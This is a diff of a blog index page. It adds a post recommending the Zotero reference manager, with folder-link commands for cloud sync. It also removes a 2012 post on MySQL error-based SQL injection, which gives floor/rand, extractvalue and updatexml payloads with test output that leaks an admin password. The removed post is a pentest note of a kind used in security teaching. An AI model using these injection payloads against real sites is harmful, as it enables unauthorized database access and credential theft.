@@ -9,7 +9,7 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="现在社会中存在很多“差别对待”问题：比如说最近很火的“3.15苹果事件"，日常生活中科技产品、汽车业、求职与工作等也经常出现这种问题，当人们遇到这种事情的时候首先想到不对等待遇，需要采用法律手段维护权利。但是有时候还真的需要采用差别对待才能把事情做好，当然这个跟上面提到的用户权利有所差别， &hellip;">
+  <meta name="description" content="自从在豆瓣上看到文献管理软件Zotero基础及进阶示范后，发现Zotero已经有Windows客户端了，并且可以利用dropbox/快盘进行同步，果断把原来使用的Mendeley卸载了。在这一周多的使用时间内感觉非常不错，因而推荐给大家。 使用范围 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +67,60 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/04/15/zotero_setting/">文献管理工具Zotero</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-04-15T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2013/04/15/zotero_setting/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><img class="aligncenter" alt="文献管理" src="http://blog.ourren.com/blog/wenxian_zotero.jpg" width="454" height="138"></p>
+
+<p>自从在豆瓣上看到<a href="http://www.douban.com/note/269931592/" target="_blank">文献管理软件Zotero基础及进阶示范</a>后，发现Zotero已经有Windows客户端了，并且可以利用dropbox/快盘进行同步，果断把原来使用的<em>Mendeley</em>卸载了。在这一周多的使用时间内感觉非常不错，因而推荐给大家。</p>
+
+<p><strong>使用范围</strong></p>
+
+<p>Zotero主要用来管理<strong>PDF文档</strong>或者演讲<strong>PPT</strong>进行管理和批注，其他网页内容和文本资料推荐用evernote/有道云笔记进行管理。</p>
+
+<p><strong>使用方案</strong></p>
+
+<p>PDF或者Slide附件采用网盘云同步，而批注采用官网提供的免费云同步。</p>
+
+<p><strong>网盘同步设置</strong></p>
+
+<p>由于上面提到的文章中只对Linux系统的网盘同步设置进行了详细说明，而有时候会使用Windows，因此补充如下：</p>
+
+<p>Linux:   ln -s /users/ouyang/dropbox/zotero/storage /users/ouyang/dev/zotero/storage</p>
+
+<p>Windows 7:  mklink /D D:\Zotero\storage E:\sync\Zotero\storage</p>
+
+<p>Windows XP: junction D:\Zotero\storage E:\sync\Zotero\storage</p>
+
+<p>其中：<a href="http://download.sysinternals.com/files/Junction.zip" target="_blank">junction</a>可以在MS网站上<a href="http://download.sysinternals.com/files/Junction.zip" target="_blank">下载</a>.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -597,138 +651,6 @@ ie.buttons[1].click
 4）AJAX Crawl: Making AJAX Applications <a href="http://e-collection.library.ethz.ch/eserv/eth:30709/eth-30709-01.pdf">http://e-collection.library.ethz.ch/eserv/eth:30709/eth-30709-01.pdf</a>
 5）rbnarcissus <a href="http://code.google.com/p/rbnarcissus/">http://code.google.com/p/rbnarcissus/</a>
 6) Watir <a href="http://watir.com/">http://watir.com/</a></p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/11/03/pentest_method_of_mysql_error/">关于Mysql注入过程中的三种报错方式</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-11-03T00:00:00-07:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/11/03/pentest_method_of_mysql_error/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>放点原来的笔记，Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这样可以通过构造如下三种方法获取特定数据。</p>
-
-<p>实际测试环境：</p>
-
-<p>[code]mysql> show tables;
-+&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| Tables_in_test |
-+&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| admin          |
-| article        |
-+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
-
-<p> </p>
-
-<p>[code]
-mysql> describe admin;
-+&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| Field | Type             | Null | Key | Default | Extra          |
-+&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| id    | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
-| user  | varchar(50)      | NO   |     | NULL    |                |
-| pass  | varchar(50)      | NO   |     | NULL    |                |
-+&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
-
-<p> </p>
-
-<p>[code]
-mysql> describe article;
-+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| Field   | Type             | Null | Key | Default | Extra          |
-+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| id      | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
-| title   | varchar(50)      | NO   |     | NULL    |                |
-| content | varchar(50)      | NO   |     | NULL    |                |
-+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
-
-<p>1、通过floor报错</p>
-
-<p>可以通过如下一些利用代码</p>
-
-<p>[code]and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x
-from information_schema.tables group by x)a);[/code]
-[code]and (select count(<em>) from (select 1 union select null union select !1)x
-group by concat((select table_name from information_schema.tables limit 1),
-floor(rand(0)</em>2)));[/code]</p>
-
-<p>举例如下：
-首先进行正常查询：</p>
-
-<p>[code]mysql> select * from article where id = 1;
-+&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+
-| id | title | content |
-+&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+
-|  1 | test  | do it   |
-+&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+[/code]</p>
-
-<p>假如id输入存在注入的话，可以通过如下语句进行报错。</p>
-
-<p>[code]mysql> select * from article where id = 1 and (select 1 from
-(select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);
-ERROR 1062 (23000): Duplicate entry &lsquo;5.1.33-community-log1&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
-
-<p>可以看到成功爆出了Mysql的版本，如果需要查询其他数据，可以通过修改version()所在位置语句进行查询。
-例如我们需要查询管理员用户名和密码：
-Method1:</p>
-
-<p>[code]mysql> select * from article where id = 1 and (select 1 from
-(select count(<em>),concat((select pass from admin where id =1),floor(rand(0)</em>2))x
-from information_schema.tables group by x)a);
-ERROR 1062 (23000): Duplicate entry &lsquo;admin8881&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
-
-<p>Method2:</p>
-
-<p>[code]mysql> select * from article where id = 1 and (select count(<em>)
-from (select 1 union select null union select !1)x group by concat((select pass from admin limit 1),
-floor(rand(0)</em>2)));
-ERROR 1062 (23000): Duplicate entry &lsquo;admin8881&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
-
-<p>2、ExtractValue
-测试语句如下</p>
-
-<p>[code]and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));[/code]</p>
-
-<p>实际测试过程</p>
-
-<p>[code]mysql> select * from article where id = 1 and extractvalue(1, concat(0x5c,
-(select pass from admin limit 1)));&ndash;
-ERROR 1105 (HY000): XPATH syntax error: &lsquo;\admin888&rsquo;[/code]</p>
-
-<p>3、UpdateXml
-测试语句</p>
-
-<p>[code]and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))[/code]</p>
-
-<p>实际测试过程</p>
-
-<p>[code]mysql> select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,
-(select pass from admin limit 1),0x5e24),1));
-ERROR 1105 (HY000): XPATH syntax error: &lsquo;^$admin888^$&rsquo;[/code]</p>
-
-<p>All, thanks foreign guys.</p>
 </div>
   
   
